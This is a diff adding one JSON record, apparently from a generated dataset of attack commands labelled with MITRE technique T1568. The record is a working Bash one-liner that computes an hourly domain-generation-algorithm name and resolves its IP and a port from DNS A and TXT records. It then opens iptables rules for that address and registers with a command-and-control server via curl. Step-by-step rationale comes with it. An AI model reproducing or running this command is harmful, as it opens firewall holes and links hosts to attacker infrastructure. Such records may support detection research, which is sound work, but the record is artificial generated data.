@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'd=$(date -u +%m%d%H | sha1sum | cut -c1-8).edge-hub.net; ip=$(dig +short A \"$d\" | head -n1); port=$(dig +short TXT _p.$d | tr -d \"\\\"\" | grep -Eo \"p=[0-9]{2,5}\" | cut -d= -f2); if [ -n \"$ip\" ] && [ -n \"$port\" ]; then iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS \"http://$d:$port/register?ts=$(date +%s)\"; fi'",
+  "explanation": "Uses TXT records to retrieve a dynamic port while resolving the DGA domain to an IP. Opens iptables for that IP:port pair and then registers with the C2.",
+  "rationale_steps": [
+    "Generate an hourly DGA domain",
+    "Resolve A record to determine the current IP",
+    "Read TXT record to extract dynamic port value",
+    "Apply iptables rules for the discovered IP:port",
+    "Send C2 registration request using curl"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-e8da1adc",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
